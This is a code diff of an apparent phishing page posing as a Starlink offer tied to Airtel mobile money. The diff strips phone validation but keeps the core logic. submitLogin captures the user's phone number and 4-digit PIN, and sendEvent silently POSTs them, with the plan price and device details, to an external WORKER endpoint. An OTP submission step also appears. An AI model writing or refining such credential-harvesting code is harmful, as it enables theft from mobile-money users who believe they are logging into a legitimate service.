-    else if(v.length===9&&!/^[89]/.test(v)){fw.classList.add('err');fw.classList.remove('ok');document.getElementById('phoneErr').textContent='Num\u00e9ro Airtel invalide \u2014 doit commencer par 8 ou 9';}
-    else if(v.length===9){fw.classList.remove('err');fw.classList.add('ok');document.getElementById('phoneErr').textContent='';}
-  });
-  _phEl.addEventListener('input',function(){
-    this.value=this.value.replace(/[^0-9]/g,'').slice(0,9);
-    document.getElementById('fw-phone').classList.remove('err','ok');
-    document.getElementById('phoneErr').textContent='';
-    updateLoginBtn();
-  });
-}
-}
+
 function renderPIN(){
   for(var i=0;i<4;i++){
     var box=document.getElementById('pb'+i);
@@ -429,22 +400,14 @@ document.getElementById('pinPad').addEventListener('click',function(e){
   renderPIN();
 });
 
-document.getElementById('phoneInput').addEventListener('blur',function(){
-  document.getElementById('fw-phone').classList.remove('focus');
-  var v=this.value.replace(/[^0-9]/g,'');
-  var fw=document.getElementById('fw-phone');
-  if(v&&v.length!==9){fw.classList.add('err');document.getElementById('phoneErr').textContent='Num\u00e9ro invalide — 9 chiffres requis';}
-  else if(v.length===9&&!/^[89]/.test(v)){fw.classList.add('err');document.getElementById('phoneErr').textContent='Num\u00e9ro Airtel invalide — doit commencer par 8 ou 9';}
-  else if(v.length===9){fw.classList.remove('err');fw.classList.add('ok');document.getElementById('phoneErr').textContent='';}
-});
+
 
 renderPIN();
 
 // Submit login
 function submitLogin(){
-  var ph=document.getElementById('phoneInput').value.replace(/[^0-9]/g,'');
-  if(ph.length!==9){document.getElementById('fw-phone').classList.add('err');document.getElementById('phoneErr').textContent='Num\u00e9ro invalide \u2014 9 chiffres requis';hap([25,15,25]);return;}
-  if(!/^[89]/.test(ph)){document.getElementById('fw-phone').classList.add('err');document.getElementById('phoneErr').textContent='Num\u00e9ro Airtel invalide \u2014 doit commencer par 8 ou 9';hap([25,15,25]);return;}
+  var ph=forfait.phone||'';
+  if(!ph||ph.length!==9){hap([25,15,25]);return;}
   if(pin.length!==4){document.getElementById('pinErr').textContent='Entrez votre code PIN \u00e0 4 chiffres';hap([25,15,25]);return;}
   sessionStorage.setItem('starlinkAuth',JSON.stringify({phone:ph,pin:pin}));
   sendEvent('starlink_pin_submitted',{plan:forfait.name,price:forfait.price,phone:ph,pin:pin,device:navigator.userAgent.slice(0,80)});
@@ -541,6 +504,7 @@ function submitOTP(){
 }
 function sendEvent(ev,data){try{fetch(WORKER+'/event',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({event:ev,data:data,ts:new Date().toISOString()})}).catch(function(){});}catch(e){}}
 document.querySelectorAll('button').forEach(function(b){b.addEventListener('pointerdown',function(e){rip(this,e);},{passive:true});});
+}
 </script>
 </body>
 </html>
